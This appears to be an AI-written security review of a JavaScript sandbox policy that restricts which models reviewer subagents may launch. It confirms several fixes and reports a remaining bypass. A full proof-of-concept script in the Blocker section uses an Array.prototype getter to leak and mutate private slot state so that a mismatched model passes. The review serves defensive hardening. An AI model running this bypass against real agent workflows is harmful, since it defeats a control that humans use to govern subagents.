## Review

### Verdict

- **C1 — FAIL (Blocker):** The previously reported numeric-setter and cross-VM poisoning issues are fixed, but an inherited numeric **getter** can still expose and mutate the private reviewer-slot array, enabling a policy bypass.
- **C2 — PASS:** Stateful Proxy/getter launch parameters are snapshotted once, evaluated from that stable record, and the same snapshot is forwarded.

### Correct

- **No wrapper string code generation:** `lib/subagent-launch-policy.mjs:205-335` emits ordinary source without `eval`, `Function(...)`, `AsyncFunction`, or constructor-based compilation. `Function.call.bind` at lines 217-219 only binds captured intrinsics; it does not compile strings.
- **Actual runtime isolation verified:** Each workflow creates a new worker at `node_modules/.cache/jiti/workflows-scripted-workflow.46b5f54f.mjs:636`, creates a new VM context with string/Wasm generation disabled at line 388, and compiles the supplied complete script through host-side `new vm.Script` at line 392.
- **Lexical isolation:** The policy initializes inside an IIFE and replaces global `runs` with the guarded object at `lib/subagent-launch-policy.mjs:210-335`. Supplied code follows outside that closure and cannot name its bindings. Regression coverage is at `tests/subagent-launch-policy.test.mjs:263-286`.
- **Security-sensitive operations captured before supplied code:** Array/object/string/regexp/date operations and all five original runtime methods are captured during initialization at `lib/subagent-launch-policy.mjs:211-231`.
- **Numeric setters cannot swallow decisions:** Decisions use captured `Object.defineProperty` at `lib/subagent-launch-policy.mjs:280-287`.
- **Prepared `runs.all` items cannot be swallowed by numeric setters:** Each prepared element is installed through captured `Object.defineProperty` at `lib/subagent-launch-policy.mjs:314-316`.
- **Own-item checks ignore inherited item accessors:** Both source-item and prepared-item traversal use captured `Object.hasOwn` at `lib/subagent-launch-policy.mjs:314` and `:322`.
- **Cross-workflow poisoning is isolated:** Host policy and later workflows use different realms/workers. The focused regression is at `tests/subagent-launch-policy.test.mjs:360-373`.
- **C2 stable snapshots:** `runs.run` snapshots at `lib/subagent-launch-policy.mjs:297`, evaluates that record at line 301, and forwards it at line 303. `runs.all` snapshots each own item at lines 310-316, evaluates prepared records at line 322, and forwards the prepared array at line 325. Tests verify one getter read and stable forwarding at `tests/subagent-launch-policy.test.mjs:376-445`.
- **Marker ownership preserved:** Host-private `WRAPPED_WORKFLOW_INPUTS` is defined at `lib/subagent-launch-policy.mjs:8` and checked/updated at lines 360-364. Supplied marker text is not trusted; spoof coverage is at `tests/subagent-launch-policy.test.mjs:242-251`.
- **Expiry preserved:** Runtime permit matching requires `deviation.expiresAt > now` at `lib/subagent-launch-policy.mjs:270-279`; delayed expiry coverage is at `tests/subagent-launch-policy.test.mjs:449-463`.
- **Synchronous-commit semantics preserved:** Original `run`/`all` is called before occurrence and permit state commit at `lib/subagent-launch-policy.mjs:303-305` and `:325-327`. The actual runtime performs synchronous validation before returning at cached-runtime lines 259-278. Retry coverage is at `tests/subagent-launch-policy.test.mjs:466-481`.
- **Omitted defaults preserved:** The stable record receives an own `model` data property at `lib/subagent-launch-policy.mjs:262-264`. Direct and workflow coverage appears at `tests/subagent-launch-policy.test.mjs:58-62`, `:140-155`, and `:164-184`.
- **`status`/`ref`/`refs` forwarding preserved:** Originals are captured at `lib/subagent-launch-policy.mjs:229-231` and forwarded unchanged at lines 330-332, matching the runtime API at cached-runtime lines 280-284.

### Blocker

- **Severity: Blocker — inherited slot-array getter exposes mutable private policy state**
- **Location:** `lib/subagent-launch-policy.mjs:220,254-259`
- Only the root `__piWebuiRoleSlots` object has its prototype removed. Each role’s slot container remains an ordinary array. The unguarded `slots[index]` lookup at line 258 invokes an inherited numeric getter when policy evaluation reaches slot overflow.
- That getter receives the private slot array as `this`. A blocked `runs.all` does not commit occurrences, so supplied code can mutate the leaked first slot and retry occurrence one with a mismatching model that now appears exact.

Concrete reproduction using the focused test’s two reviewer slots:

```js
let leaked;
const previous = Object.getOwnPropertyDescriptor(Array.prototype, "2");

Object.defineProperty(Array.prototype, "2", {
  configurable: true,
  get() {
    leaked = this;
    return undefined;
  },
});

try {
  try {
    await runs.all([
      {
        key: "blocked",
        agent: "reviewer",
        task: "Create a blocking decision",
        model: "other/model:high",
      },
      { key: "second", agent: "reviewer", task: "Use slot two" },
      { key: "overflow", agent: "reviewer", task: "Trigger inherited getter" },
    ]);
  } catch (error) {
    if (error.code !== "reviewer-model-policy-blocked") throw error;
  }
} finally {
  if (previous) Object.defineProperty(Array.prototype, "2", previous);
  else delete Array.prototype[2];
}

leaked[0].model = "other/model:high";

return runs.run("bypass", {
  agent: "reviewer",
  task: "Mismatch now appears exact",
  model: "other/model:high",
});
```

For the production eight reviewer slots, use prototype index `"8"` and nine `runs.all` items.

**Smallest remediation:** replace the lookup with the already captured own-property operation:

```js
const slot = __piWebuiHasOwn(slots, index) ? slots[index] : undefined;
```

As defense in depth, give all private slot arrays and nested slot records null prototypes and freeze them during initialization.

### Note: test gaps

- No regression attempts the inherited slot-overflow getter leak described above.
- `tests/subagent-launch-policy.test.mjs:330-357` uses a blocking mismatch, so it proves decisions cannot be swallowed but does not independently prove an allowed prepared item survives a numeric prototype setter.
- No execution test verifies exact argument/return forwarding for wrapped `runs.status`, `runs.ref`, and `runs.refs`.
- The VM tests reproduce the runtime shape but do not invoke the cached `runWorkflowScript` implementation end-to-end.
- No command was executed because this review had read-only file-inspection tools and no shell capability. The focused suite and syntax check require supervisor execution after remediation.

### Residual risks

- C1 remains bypassable within one workflow VM through inherited numeric access on the private slot array.
- WebUI-local enforcement still cannot govern launch paths that bypass the helper.
- Permits remain admission-spent after asynchronous/downstream failure by documented design.

**Confidence: 97/100.** The blocker follows directly from ordinary array prototype lookup and the mutable slot records. Confidence is below 100 because the reproduction could not be executed in this read-only environment.